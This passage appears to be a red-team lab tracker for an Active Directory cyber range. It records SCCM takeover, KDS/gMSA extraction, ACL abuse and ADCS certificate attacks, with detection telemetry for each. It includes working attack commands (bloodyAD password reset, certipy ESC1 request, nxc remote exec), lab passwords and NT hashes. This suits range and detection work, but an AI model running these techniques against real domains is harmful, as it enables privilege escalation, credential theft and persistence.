| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | WinSec 4769 cross-forest; Zeek kerberos.log |

#### WT034 — SCCM NAA Credential Extraction

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified — SCCM NAA credentials extracted from `\\mbr02\vault\naa-rotation-notice.txt` using `svc_sccm` (SCCM Full Admin) read access. Actual NAA account: `range\svc_naa` / `N@A_s3rv1c3!`. Verified `range\svc_naa` is Domain Admin on `dc03` via `nxc smb dc03 -u 'range\svc_naa' -p 'N@A_s3rv1c3!' -X 'whoami /groups'`. |
| **Technique** | Extract SCCM Network Access Account (NAA) credentials from the SCCM `vault` share on `mbr02` |
| **What it earns** | `range.local\svc_naa` (Domain Admin) |
| **RedStrike Intent** | `sharpsccm.get_naa` |
| **State Output** | SET_STATE(creds.svc_naa.password = "N@A_s3rv1c3!"; creds.svc_naa.domain = "range.local") |
| **Key telemetry** | WinSec 4624 (SMB logon to `mbr02`); SMB read to `vault\naa-rotation-notice.txt`; Zeek `smb_files.log` / `dce_rpc.log` |
| **Playbook fix** | No playbook fix required — SCCM site deployed via manual steps in `docs/sccm-integration-guide.md`; verify-only playbook is `08-sql-sccm-wsus-verify.yml` (not `10-sccm-verify.yml`) |

#### WT035-039 — SCCM Attack Chain

> **2026-08-01 deep validation (as `range\svc_sccm` via SMS Provider WMI explicit creds from ws01):** SMS Provider access proven (local `SMS Admins` membership); PXE approved cert + 2 boot images + NAA-in-policy confirmed (WT035 surface); client-push component enabled + `GenerateCCRByName`/`CreateCCR` available (WT036 primitive); `SMS_Scripts.CreateScripts` + `SMS_Package`/`SMS_Program` creation work (WT038/039 staging). **CORRECTED — the AdminService IS deployed** (self-hosted `SMS_REST_PROVIDER` in `SMS_EXECUTIVE`, no IIS; endpoint `/AdminService/v1.0/` → 401 = up). CD chain verified to the ST (S4U2Proxy fixed: UAC `TrustedToAuthForDelegation`). **SPN owner FIXED + VERIFIED (2026-08-01):** the self-hosted AdminService always runs as LocalSystem and can only decrypt machine-account tickets → `HTTP/mbr02.range.local` MOVED to `mbr02$` (svc_sccm keeps decoy `HTTP/sccm.range.local` for WT033 Kerberoast; CD unchanged). Verified live: getST → ST encrypted to `mbr02$` → `AdminService/wmi/SMS_Site` → **200** as `administrator` (anon 401). WT037/039 auth gate CLOSED. `SMS_Advertisement.Put` = Generic failure via raw WMI (needs console) — later solved (2026-08-02) via the AdminService `SMS_Application` wmi passthrough + `mp.msi` MP repair (WT038) and AdminService script run (WT039). **`cifs/mbr02.range.local` SPN missing** → SMB Kerberos to mbr02 broken (verify-playbook candidate). Test objects cleaned up.

> **2026-08-02 FULL EXEC VERIFIED:** WT037 (CMPivot), WT038 (app deploy), WT039 (script-as-SYSTEM) all executed live from ws01 as `range\svc_sccm` against the **WS01 managed client** (ResourceID 16777220). Three real enablers, in order: (1) **BGB fast channel** — `C:\Program Files\SMS_CCM\SMS_BGB` vdir was empty (`/bgb/handler.ashx` → 500) → installed `cd.latest\SMSSETUP\BIN\X64\bgbisapi.msi` + restarted `SMS_EXECUTIVE` → TCP 10123 listening, client signed in; (2) **svc_sccm was never an RBAC admin** (only `MBR02\vagrant` in `RBAC_Admins`) → granted Full Admin via the Takeover-1 DB primitive (`RBAC_Admins` + `RBAC_ExtendedPermissions` mirroring admin 16777217) → Device read 403→200; (3) **script approval** — `UpdateApprovalState` → 500 (author can't self-approve) → `UPDATE Scripts SET ApprovalState=3` (table is `Scripts`). **WT038 delivery blocker (4th):** MP web handlers empty (`SMS_MP`/`ServiceData\System` → `/SMS_MP/.sms_aut` 500 → client `/ccm_system/request` 0x8000000A) → `mp.msi REINSTALL=ALL` → health 200 → payload ran as SYSTEM on WS01. Recipes + full commands in `docs/sccm-integration-guide.md` **Phase 6B/6C/6C.4**.

| WT# | Technique | Status | Target | What it earns |
|-----|-----------|--------|--------|---------------|
| WT035 | SCCM PXE Boot abuse | ✅ Surface verified (2026-08-01): approved PXE cert + 2 boot images + NAA-in-policy readable by svc_sccm; full boot-image exploit needs real PXE client | mbr02 | Bare-metal boot → domain join account |
| WT036 | SCCM Client Push | ⚠️ Primitive verified: component enabled + `GenerateCCRByName`/`CreateCCR` available; relay needs console-created target device record | mbr02 | Coerced auth / lateral movement |
| WT037 | SCCM CMPivot | ✅ **FULL EXEC VERIFIED 2026-08-02** — `RunCMPivot` on WS01 (16777220) via AdminService as svc_sccm (NTLM) returned live data (`DeviceID:"C:", FileSystem:"NTFS", FreeSpace:153601, SystemName:"WS01"`). Enablers: svc_sccm Full Admin via DB grant (Fix 2) + BGB fast channel up (Fix 1). SPN/CD fixes from 2026-08-01 still apply | mbr02 | Remote query/exec on managed clients |
| WT038 | SCCM Application Deploy | ✅ **FULL EXEC VERIFIED 2026-08-02** — app 16777510 + DT 16777511 + assignment 16777217 via AdminService wmi passthrough; MP web handlers repaired (`mp.msi`) → client policy delivered → payload ran as SYSTEM on WS01 | mbr02 | Push malicious app to clients |
| WT039 | SCCM Site Takeover | ✅ **FULL EXEC VERIFIED 2026-08-02** — script created via `/AdminService/wmi/SMS_Scripts.CreateScripts/`, approved via DB (`Scripts` table ApprovalState=3), run via `RunScript` on WS01 → `ScriptOutput: "nt authority\\system"` + marker files on WS01 | mbr02 | Full SCCM site admin → DA in range.local |

#### Skipjack — Cross-Forest Trust Downgrade via PAC Signature Corruption (Phase 8 alt)

| Field | Value |
|-------|-------|
| **Status** | 🔬 Deferred — needs custom Rubeus build or `skipjack_forge.py` |
| **Att&ck** | T1134.005 (ExtraSids) |
| **Technique** | Corrupt Kerberos PAC signatures → DC enters downgrade fallback → forged SID (e.g., EA) kept due to SID filtering OFF |
| **Prerequisite** | Cross-forest trust with SID filtering disabled; attacker controls user in child domain |
| **Source** | `ws01` as `intern_blue` or any child user |
| **Target** | dc01 (`cadre.local`) or dc03 (`range.local`) |
| **What it earns** | Domain Admin / Enterprise Admin in target forest without DCSync |
| **RedStrike Intent** | `rubeus.pac_corrupt` / `rubeus.asktgt` |
| **State Output** | SET_STATE(creds.<target_forest>_ea.ticket = <forged PAC TGT>) |
| **Key telemetry** | WinSec 4826 (rare); Zeek cross-realm TGS with corrupted PAC auth-data |
| **Status** | ⏳ Pending custom PoC |

---

## Post-DA Sub-Phase — KDS/gMSA/dMSA Cluster + Extensions (WT097-109)

> Adopted 2026-08-02; **validated 2026-08-03** (see row statuses). All items are post-exploitation primitives run with **Domain Admin**. Detection is host-side only (LSA-secret access / DPAPI blob reads) — no network signature. **Rule 3:** extraction + prerequisites = VERIFIED; password computation / mutating steps = user practice. See `CAMPAIGNS_v3.md` "Post-DA Sub-Phase" + Branch 3.5O + Phase 3 alt + Branch B ESC16.

#### WT097 — KDS Root Key Extraction

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 — 2 × 64-byte root-key blobs via LDAPS as DA (`ec8f491f-…` + `877a6c10-…`); SP800_108_CTR_HMAC, DH 512/2048. Note: `Get-KdsRootKey` cmdlet returns null RootKeyData in this env — direct LDAP read is the reliable path |
| **Att&ck** | T1552 (Unsecured Credentials) |
| **Technique** | Extract the KDS Root Key (`CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration`) — master secret for gMSA/dMSA passwords + DPAPI-NG SID protectors |
| **Prerequisite** | DA on `cadre.local` (`chief_command`) |
| **Source** | ws01/mbr01 (DSInternals `Get-KdsRootKey` / LDAP `msKds-RootKeyData` / mimikatz `lsadump::backupkeys`) |
| **Target** | dc01 (`cadre.local`) |
| **What it earns** | Offline computation of every gMSA/dMSA password + DPAPI-NG decryption (enabler for WT098/099/103) |
| **Key telemetry** | LSA secret access, WinSec 4662 on `msKds-RootKeyData` |
| **Cross-refs** | Campaign_suggestions Post-DA #84; source: Grafnetter TROOPERS26 |

#### WT098 — Golden gMSA Attack

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (prereqs — Rule 3): KDS key `877a6c10-…` (from pwdid), gMSA SID S-1-5-21-277764030-1371232215-1561074416-1131, msDS-ManagedPasswordId (L0/L1/L2 + RootKeyIdentifier). Offline compute = user practice (pyGoldenGMSA / SP800-108; GoldenGMSA 1.0.1.0 expects full KDS_ROOT_KEY, lab stores 64-byte blob). NT-hash oracle from WT024 (`0c81acad…`) |
| **Att&ck** | T1558 / T1552 |
| **Technique** | Compute gMSA password offline from KDS root key + `msDS-ManagedPassword` blob |
| **Prerequisite** | WT097 + blob read (Branch A ACE#10 — `eng_cloud` → `gmsaTools$`, verified WT024) |
| **Source** | ws01 (DSInternals `ConvertFrom-ManagedPasswordBlob` / gMSADumper) |
| **Target** | `gmsaTools$` |
| **What it earns** | gMSA plaintext → SMB/Kerberos auth as `gmsaTools$` (offline, no LSA) |
| **Key telemetry** | LDAP read of `msDS-ManagedPassword` (same as WT024) |
| **Cross-refs** | Branch A ACE#10/WT024; Campaign_suggestions Post-DA #85 |

#### WT099 — Golden dMSA / BadSuccessor (Server 2025)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (prereqs — Rule 3): range KDS root key 64B (`dc09b2f5-…`) + dMSA `dmsaPrivService$` SID + `msDS-ManagedPasswordId` 100B via DirectoryEntry on dc03 from ws01 (`wt099-dmsa-prereq.ps1`). Offline BadSuccessor compute = user practice |
| **Att&ck** | T1558 / T1552 |
| **Technique** | Compute delegated-MSA (dMSA) password offline from KDS root key (BadSuccessor) / post-patch BetterSuccessor |
| **Prerequisite** | WT097 + dMSA in `range.local` (`dmsaPrivService$` — Branch A ACE#24) |
| **Source** | ws01 / provisioning (DSInternals dMSA support) |
| **Target** | `dmsaPrivService$` (range.local) |
| **What it earns** | dMSA plaintext → service auth in range.local |
| **Key telemetry** | KDS/dMSA blob reads (4662) |
| **Cross-refs** | Branch A ACE#24; Campaign_suggestions Post-DA #88 |

#### WT100 — LAPS Bulk Extraction

| Field | Value |
|-------|-------|
| **Status** | 🔬 DEFERRED 2026-08-03 — LAPS NOT implemented (no `ms-Mcs-AdmPwd` schema, no `msLAPS-Password`, no playbook). Future suggestion — needs LAPS deployment |
| **Att&ck** | T1552.004 |
| **Technique** | Bulk-read `ms-Mcs-AdmPwd` / `msLAPS-Password` via LDAP (domain-wide local-admin recovery) |
| **Prerequisite** | DA; LAPS configured (mbr01 per `04-vulnerabilities.yml`) |
| **Source** | ws01 (nxc `--laps` / ldapsearch) |
| **Target** | All LAPS-managed machines |
| **What it earns** | Local admin on every LAPS machine |
| **Key telemetry** | WinSec 4662 bulk reads on LAPS attribute |
| **Cross-refs** | Phase 3.5 `3.5L`; Campaign_suggestions Post-DA #87 |

#### WT101 — DSRM Password Extract & Set

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 (extraction — Rule 3): DSRM `Administrator:500` NT hash `81c3b6443f148bf73bb3499791f1eb7b` (SAM RID-500) = cadre.local Administrator hash (cross-validated via ESC1 UnPAC); `DsrmAdminLogonBehavior` absent (default blocked). SET + logon-behavior enable = user practice |
| **Att&ck** | T1098.001 / T1003 |
| **Technique** | Extract DC DSRM (local SAM) hash; enable DSRM remote logon (`DsrmAdminLogonBehavior=2`) or set new DSRM password (persistence) |
| **Prerequisite** | DA on dc01 |
| **Source** | dc01 (mimikatz `lsadump::sam`, `ntdsutil`, registry) |
| **Target** | dc01 |
| **What it earns** | DC-local persistence that survives krbtgt rotation |
| **Key telemetry** | Local SAM access (4663/4688), `DsrmAdminLogonBehavior` registry change |
| **Cross-refs** | Campaign_suggestions Post-DA #86 |

#### WT102 — DCShadow

| Field | Value |
|-------|-------|
| **Status** | ⛔ BLOCKED 2026-08-03 — mimikatz dcshadow "computer not found in AD 0x1" (env/computer-resolution on ws01 in all contexts). Prereqs validated (EA, child/krbtgt `b6c370f2…`, child SID, target/FakeDC objects). Reopen: same-domain/SYSTEM context or tooling debug |
| **Att&ck** | T1098 / T1550.002 |
| **Technique** | Push malicious attributes (SID history/SPN/membership) via DRS replication from non-DC (inverse of DCSync) |
| **Prerequisite** | DA + DRS rights (held since Phase 6) |
| **Source** | ws01 (mimikatz `lsadump::dcshadow` / krbrelayx) |
| **Target** | AD (cadre.local) |
| **What it earns** | Credential-free persistence/injection with no normal object-modification events |
| **Key telemetry** | WinSec 4662 replication from non-DC; Zeek DCE-RPC `drsuapi` from non-DC |
| **Cross-refs** | Phase 6 WT009 (inverse); Campaign_suggestions DCShadow |

#### WT103 — DPAPI-NG SID Protector Decryption

| Field | Value |
|-------|-------|
| **Status** | 🔬 DEFERRED 2026-08-03 — no DPAPI-NG protected blob staged in lab (audit §2.19). WT097 KDS extraction ✅; decrypt exercise needs BitLocker/PFX/DNSSEC/ASP.NET target |
| **Att&ck** | T1555 |
| **Technique** | Decrypt DPAPI-NG SID-protected blobs (BitLocker/PFX/DNSSEC/ASP.NET) with KDS root key |
| **Prerequisite** | WT097 + protected blob |
| **Source** | ws01 (DSInternals / custom) |
| **Target** | Protected stores |
| **What it earns** | Recovery of BitLocker keys, PFX certs, DNSSEC keys, ASP.NET MachineKey |
| **Key telemetry** | DPAPI-NG blob reads (4663) |
| **Cross-refs** | Campaign_suggestions Post-DA #89 |

#### WT104-107 — Persistence Extensions (DLL/COM Hijacking, IFEO, LSA SSP)

| Field | Value |
|-------|-------|
| **Status** | ⚠️ Partial 2026-08-03 — WT105 COM ✅; WT106 IFEO ✅; **WT104/107 🔬 deferred** (DLL-hijack app + SSP DLL not staged — audit §2.19) |
| **Att&ck** | T1574.001 (DLL), T1546.015 (COM), T1546.012 (IFEO), T1547.005 (LSA SSP) |
| **Technique** | Four host-persistence primitives: trusted-app DLL hijack; COM `LocalServer32`/`InprocServer32` repoint; IFEO `Debugger` key; malicious SSP in LSASS (cleartext capture) |
| **Prerequisite** | SYSTEM on mbr01 (SQL→GodPotato chain) |
| **Source** | mbr01 (SYSTEM) |
| **Target** | mbr01 / ws01 |
| **What it earns** | Reboot-persistent execution + credential capture (SSP) |
| **Key telemetry** | Sysmon EID 7 (SSP image load), EID 11 (DLL drop), EID 12/13 (registry), WinSec 4688 (IFEO) |
| **Cross-refs** | Branch 3.5O; Campaign_suggestions Phase 5 persistence |

#### WT108 — DCOMIllusionist (Fileless DCOM Lateral)

| Field | Value |
|-------|-------|
| **Status** | ⏳ Not exercised — Phase 3 alt |
| **Att&ck** | T1021 (Remote Services: DCOM) / T1218 |
| **Technique** | Fileless DCOM lateral movement via .NET deserialization abuse (Synacktiv) |
| **Prerequisite** | ws01 access as `analyst_t1`; DCOM reachable to mbr01 |
| **Source** | ws01 |
| **Target** | mbr01 |
| **What it earns** | Lateral code exec without on-disk payload |
| **Key telemetry** | Sysmon EID 1 (dllhost.exe/scrobj.dll child), EID 10 (DCOM cross-process), Zeek DCOM/RPC |
| **Cross-refs** | Phase 3 Alternative Execution; Campaign_suggestions DCOMIllusionist |

#### WT109 — ESC16 (CA SID-Extension Disable)

| Field | Value |
|-------|-------|
| **Status** | ✅ VERIFIED 2026-08-03 — `DisableExtensionList` ABSENT on cadre-CA → SID extension enabled → ESC16 not configured (default). ManageCA capability exists (ESC7, verified) |
| **Att&ck** | T1648 (Serverless/CA config abuse) |
| **Technique** | CA `DisableExtensionList` contains SID OID (`1.3.6.1.4.1.311.25.2`) → issued certs stripped of SID extensions (CA-admin-level misconfig) |
| **Prerequisite** | ManageCA on cadre-CA (held: `lead_engineering` ESC7 verified) |
| **Source** | ws01 (certipy `-ca -show` / CA config) |
| **Target** | cadre-CA (dc01) |
| **What it earns** | Breaks SID-based authZ / conditions cert-based attacks |
| **Key telemetry** | WinSec 4886/4887 CA config, certipy CA ACL ops |
| **Cross-refs** | Branch B ESC7 (verified); Campaign_suggestions ESC16 |

---

## Branch A: ACL Abuse (cadre.local)

| Field | Value |
|-------|-------|
| **Status** | ✅ All paths VERIFIED 2026-07-31 — WT015 (ACE#7 ForceChangePassword), WT013 (WriteDacl), WT014 (GenericWrite→Shadow Creds), WT016 (GenericAll OU), WT008 (Shadow Creds dc01$), WT023 (GPO abuse), WT024 (gMSA extraction), GPP (stored password), WT025 (AdminSDHolder). DACL restored to pristine 23 ACEs. |
| **Stream** | Branch A |
| **Att&ck** | T1098 (Account Manipulation), T1484 (Domain Policy Modification), T1548 (Abuse Elevation Control Mechanism) |
| **Technique** | Abuse over-permissive ACEs discovered by BloodHound to escalate to DA in `cadre.local` |
| **Playbook** | `05-ad-attack-surface.yml` — ACEs 1-26 (ACE#7 exact-right check fixed in deploy task) |
| **Prerequisite** | Earned `cadre.local` credential with rights to modify the target AD object (user, group, computer, OU). `analyst_t1` (child domain) is **not** valid for root-domain ACL abuse. Primary entry: `hunter_dfir` (WT031 password spray or Phase 3.5A-derived). Fallback: `chief_command` (DA). |
| **Source machine** | `ws01` as `hunter_dfir` / `DF1R_Hunt3r!` (or `chief_command` fallback). `analyst_t1` must not be used here. |
| **Target machine** | dc01 (`192.168.77.10`) — root DC / cadre.local |
| **Domain** | `cadre.local` |
| **Key finding** | ACE#7: `hunter_dfir → chief_command: ForceChangePassword` — fastest path to root DA+EA |
| **Key telemetry** | WinSec 4662 (write to AD object), 4738 (password reset), 5136 (directory service change); Zeek ldap.log |
| **Script** | `T013-acl-writedacl-ws01.sh`, `T014-acl-genericwrite-ws01.sh`, `T015-acl-forcechangepassword-ws01.sh`, `T016-acl-genericall-ou-ws01.sh`, `T023-gpo-abuse-ws01.sh`, `T024-gmsa-extraction-ws01.sh` |
| **RedStrike Intent** | `bloodyad.set_password` / `bloodyad.add_generic_all` |
| **State Output** | SET_STATE(creds.chief_command.password = "<new password>") |

#### Path A — ForceChangePassword (WT015)

| Field | Value |
|-------|-------|
| **WT#** | 015 |
| **Status** | ✅ Verified live — ACE#7 was missing on `chief_command` during test; re-applied via corrected `05-ad-attack-surface.yml`
| **Starting credential** | `hunter_dfir` / `DF1R_Hunt3r!` (WT031 password spray or Phase 3.5A-derived) | (exact-right check now matches verify-only) and verified with `05-ad-attack-surface-verifyOnly.yml` (18/18 PASS). `hunter_dfir` successfully reset `chief_command` password to `NewChiefPass123!` and restored to original `C0mm@nd_Ch1ef!`. |
| **Technique** | Reset password of high-priv user using `ForceChangePassword` ACE |
| **ACE#** | 7 (`hunter_dfir → chief_command: ForceChangePassword`) |
| **What it earns** | `chief_command` credential → root DA+EA |
| **RedStrike Intent** | `bloodyad.set_password` |
| **State Output** | SET_STATE(creds.chief_command.password = "<new password>") |
| **Command** | `bloodyAD --host dc01.cadre.local -u hunter_dfir -p 'DF1R_Hunt3r!' -d cadre.local set password chief_command 'NewChiefPass123!'` |
| **Script** | `T015-acl-forcechangepassword-ws01.sh` |
| **Playbook fix** | `05-ad-attack-surface.yml` ACE#7 deploy task now checks exact `(IdentityReference = hunter_dfir SID) AND (ObjectType = ForceChangePassword GUID)` before skipping, matching `05-ad-attack-surface-verifyOnly.yml` exact-right check. |

#### Path B — WriteDacl Self-Escalate (WT013)

| Field | Value |
|-------|-------|
| **WT#** | 013 |
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | Grant self GenericAll on own user or other object using WriteDacl |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) |
| **What it earns** | Full control over target AD object |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T013-acl-writedacl-ws01.sh` |

#### Path C — GenericWrite → Shadow Credentials (WT014)

| Field | Value |
|-------|-------|
| **WT#** | 014 |
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | `GenericWrite` on user → add `msDS-KeyCredentialLink` (Shadow Credentials) → authenticate as that user via PKINIT |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) |
| **What it earns** | NT hash / TGT of target user |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T014-acl-genericwrite-ws01.sh` |

#### Path D — GenericAll on OU (WT016)

| Field | Value |
|-------|-------|
| **WT#** | 016 |
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | `GenericAll` on OU → add GPO link or modify child objects |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) |
| **What it earns** | DA or mass object control |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T016-acl-genericall-ou-ws01.sh` |

#### Path E — Shadow Credentials on dc01$ (WT008)

| Field | Value |
|-------|-------|
| **WT#** | 008 |
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | Add Shadow Credentials to `dc01$` computer account → authenticate as DC |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) |
| **What it earns** | DC machine account TGT → DCSync rights |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T008-shadow-credentials-ws01.sh` (corrected: pywhisker in-script, explicit creds + LDAPS; PKINIT TGT via gettgtpkinit; NT hash via getnthash) |
| **Execution note** | Whisker.exe / Start-Process -Credential fails in SSH session (0xC0000142); pywhisker takes -u/-p in-process — no scheduled task needed. Result: dc01$ NT hash `09493093db08c8afa99193779d401b34` |

#### Path F — GPO Abuse (WT023)

| Field | Value |
|-------|-------|
| **WT#** | 023 |
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | Modify GPO to push scheduled task, registry, or rights assignment |
| **Starting credential** | `analyst_cloud` / `Cl0ud_An@lyst!` (Phase 3.5A extraction from mbr01) — alternative GPO path |
| **What it earns** | Lateral movement / persistence / privilege escalation across OU |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Script** | `T023-gpo-abuse-ws01.sh` (corrected: PowerView -Credential + SMB preference write in-script) |
| **Execution note** | analyst_cloud holds WriteDacl/WriteOwner/GenericAll on Vulnerable-GPO `{885EE71C-79CD-4006-B7CF-616B449F745B}` (ACE#1); wrote + read back + deleted ScheduledTasks.xml preference via SYSVOL SMB as analyst_cloud |

#### Path G — gMSA Extraction (WT024)

| Field | Value |
|-------|-------|
| **WT#** | 024 |
| **Status** | ✅ Verified |
| **Technique** | Read `msDS-ManagedPassword` blob for `gmsaTools$` (ACE#10: `eng_cloud → gmsaTools$: ReadGMSAPassword`) → decode MSDS-MANAGEDPASSWORD_BLOB → compute NT hash (MD4 of UTF-16LE) → validate auth as `gmsaTools$` |
| **Starting credential** | `eng_cloud` / `Cl0ud_Eng!` (ACE#10 ReadGMSAPassword — NOT chief_command/GoldenGMSA; corrected to match `05-ad-attack-surface.yml` ACE#10) |
| **What it earns** | `gmsaTools$` NT hash `0c81acad6a91e28bc1622ac9bf0cce05` (SMB auth as gmsaTools$ verified ✅) |
| **RedStrike Intent** | `bloodyad.read_gmsa` / `gmsa-ng` |
| **State Output** | SET_STATE(creds.gmsaTools.nthash = "0c81acad6a91e28bc1622ac9bf0cce05") |
| **Script** | `t024-gmsa-extract.py` (ws01-native, in-script: ldap3 LDAPS bind as eng_cloud → blob decode → pure-MD4 → impacket SMB auth check) |
| **Execution note** | 2026-07-31 verified from ws01 `.62` — LDAPS bind OK, blob 548 bytes, NTHASH `0c81acad...`, SMB_AUTH_OK as gmsaTools$. Prior run via GoldenGMSA/cache/gmsainfo as chief_command superseded — ACE#10 eng_cloud is the configured attack surface. |

#### GPP Stored Password (Groups.xml)

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified (2026-07-31) |
| **Technique** | Find and decrypt `cPassword` in legacy GPP `Groups.xml` in SYSVOL |
| **Starting credential** | `analyst_cloud` / `Cl0ud_An@lyst!` (SMB read on SYSVOL) |
| **What it earns** | `svc_ldap` / `s3rv1c3_Ld@p!` (SMB auth as svc_ldap verified ✅) |
| **Command** | `Get-GPPPassword` (script: `gpp-stored-password.py`, ws01-native, impacket SMB + AES-256-ECB MS14-025 static key) |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(creds.svc_ldap.password = "s3rv1c3_Ld@p!") |
| **Execution note** | 2026-07-31 verified from ws01 `.62` as analyst_cloud — SYSVOL walk found `Groups.xml` in Vulnerable-GPO (`{885EE71C-...}`), cpassword `SJdRfgL08RXe4gdPngTefd3BFXTwkOk/fWTi9K0TGeY=` decrypted to `s3rv1c3_Ld@p!`. **Attack surface was misconfigured** in lab: `02-ad-objects.yml` deployed Groups.xml referencing non-existent `svc_backup` with malformed 43-char cpassword. Fixed playbook to reference real `svc_ldap` + valid cpassword (`s3rv1c3_Ld@p!` AES-256-ECB), re-ran on dc01, verified. `05-ad-attack-surface.yml` GPP task aligned to same value. Both verify-only playbooks updated to check svc_ldap + valid cpassword. |

#### SPN Jacking — CVE-2026-25177 (WT027)

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified 2026-08-01 |
| **Technique** | Abuse writeSPN/validatesPSN to Kerberoast target account |
| **What it earns** | Target account TGS → offline crack |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Execution note** | Documented self-write command NOT viable — real AD behavior: (1) `MSSQLSvc/mbr01.child.cadre.local:1433` is owned by `child\svc_mssql` → forest-wide SPN uniqueness → constraint violation; (2) free cross-host service SPN via SELF-write → Access denied (default validated-write to servicePrincipalName only allows own-host). Verified path: `chief_command` (DA, writeSPN) plants `MSSQLSvc/dc01.cadre.local:14333` on analyst_cloud → KDC issued TGS (AES) encrypted with analyst_cloud's key → offline-crackable. Cleaned. Scripts: `wt027-spn-jack.ps1` / `-cleanup.ps1` / `-lookup*.ps1` (04-automation/windows). |

#### Persistence — AdminSDHolder (WT025)

| Field | Value |
|-------|-------|
| **Status** | ✅ Verified 2026-07-31 |
| **Technique** | Modify AdminSDHolder template → ACL propagated to protected accounts |
| **What it earns** | Persistent DA rights |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Execution note** | `analyst_cloud` (WriteDacl = ACE6) added GenericAll backdoor ACE on AdminSDHolder via `PsBase.Options.SecurityMasks=Dacl`; ACE persisted. DACL had been polluted to 99 ACEs during an earlier PowerView attempt → restored from pristine range.local template (SID-translated) + re-added surface ACE → **23 ACEs, protected, no rogue GenericAll**. Exploit: `t025-adminsdholder-exploit.ps1`; restore: `t025-restore.ps1` + `t025-readd-aces.ps1`. |

---

## Branch B: ADCS (Certificate Services)

| Field | Value |
|-------|-------|
| **Status** | ✅ ESC1 (WT050) / ESC3 (WT051) / UnPAC (WT053) verified 2026-08-01; **ESC2 / ESC9 / ESC4 / ESC7 verified 2026-08-01** (CADRE-ESC2/ESC9 low-priv enrollment → PKINIT admin + UnPAC NT hash; ESC4 lead_engineering WriteDacl → template modify/enroll → restored; ESC7 lead_engineering ManageCA officer add/remove). **ESC8 (WT052) deferred** (no SMB-authenticated coerce on Server 2025 — root cause documented). **ESC11 deferred with ESC8** (relay family). **ESC13/14 NOT deployed**; ESC6 not deployed (User Specified SAN disabled). |
| **Stream** | Branch B |
| **Att&ck** | T1649 (Steal Crypto Wallet / Private Key), T1550 (Use Alternate Auth Material), T1553 (Subvert Trust Controls) |
| **Technique** | Abuse misconfigured ADCS templates to request certificates as any user or escalate to DA |
| **Playbook** | `08-adcs-deploy.yml` — deploys ADCS with ESC1-ESC8 vulnerable configurations |
| **Prerequisite** | Domain Admin in `cadre.local` (from Branch A WT015 `chief_command`, or Phase 7 Golden Ticket). ADCS is in the root domain; a child-domain user cannot authenticate to the CA templates. |
| **Source machine** | `ws01` as `chief_command@cadre.local` / `C0mm@nd_Ch1ef!` (or any `cadre.local` DA/EQ credential; optionally via Golden Ticket). |
| **Target machine** | dc01 (`192.168.77.10`) — CA host |
| **Domain** | `cadre.local` |
| **Starting credential** | `chief_command` (DA+EA, earned via Branch A) or forged `administrator@cadre.local` TGT from Phase 7 |
| **What it earns** | Certificate as high-priv user → NT hash via `PKINIT` pfx → DA |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |
| **Key telemetry** | WinSec 4886/4887 (certificate request/issue); Sysmon EID 1 (`Certipy.exe`), 3; Zeek http.log to CA web enrollment |
| **Script** | `T050-esc1-ws01.sh`, `T051-esc3-ws01.sh`, `T052-esc8-ws01.sh`, `T053-unpac-thehash-ws01.sh` |

#### ESC1 — Vulnerable Web Enrollment Template

| Field | Value |
|-------|-------|
| **WT#** | 050 |
| **Status** | ✅ Active |
| **Technique** | Request certificate with arbitrary SAN (`UPN=administrator`) from template with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and no manager approval |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) or Golden Ticket |
| **What it earns** | Certificate as `administrator` → NT hash |
|| **Command** | `certipy req -u chief_command@cadre.local -p 'C0mm@nd_Ch1ef!' -target dc01.cadre.local -ca cadre-CA -template VulnerableWebEnrollment -upn administrator@cadre.local` |
| **Script** | `T050-esc1-ws01.sh` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

#### ESC3 — Enrollment Agent

| Field | Value |
|-------|-------|
| **WT#** | 051 |
| **Status** | ✅ Active |
| **Technique** | Enrollment agent certificate → request cert on behalf of another user |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) or Golden Ticket |
| **Script** | `T051-esc3-ws01.sh` |
| **RedStrike Intent** | — |
| **State Output** | SET_STATE(<manual>) |

#### ESC8 — NTLM Relay to ADCS Web Enrollment

| Field | Value |
|-------|-------|
| **WT#** | 052 |
| **Status** | 🔬 DEFERRED 2026-08-01 — revisit at end. Root cause identified: no SMB-authenticated coerce works on Server 2025 (see Execution note). Surface stays configured. |
| **Technique** | Coerce dc01$ or other account to authenticate to attacker listener; relay NTLM to ADCS web enrollment → certificate |
| **Starting credential** | `chief_command` / `C0mm@nd_Ch1ef!` (DA earned via Branch A T015) or Golden Ticket |
